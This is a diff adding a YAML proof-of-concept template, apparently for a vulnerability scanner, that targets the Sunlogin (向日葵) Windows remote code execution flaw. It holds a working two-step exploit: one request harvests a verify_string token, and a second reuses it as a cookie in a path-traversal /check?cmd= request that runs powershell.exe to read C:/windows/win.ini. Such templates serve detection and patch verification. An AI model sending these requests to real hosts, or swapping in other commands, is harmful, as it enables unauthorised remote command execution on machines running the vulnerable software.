@@ -1,0 +1,23 @@
+id: poc-yaml-sunflower-windows-rce
+info:
+  name: 向日葵Windows远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 向日葵
+  osprey-id: vb_2022_0009
+requests:
+- method: GET
+  path: /cgi-bin/rpc?action=verify-haras
+  expression: 'contains(body, "verify_string")
+
+    '
+  output:
+  - regex_match(body, "\"verify_string\":\"(?P<verify_string>.+?)\"")
+- method: GET
+  path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+cat+C:/windows/win.ini
+  headers:
+    Cookie: CID={{.verify_string}}
+  expression: contains(body, "; for 16-bit app support")
+variables: {}
+transport: http
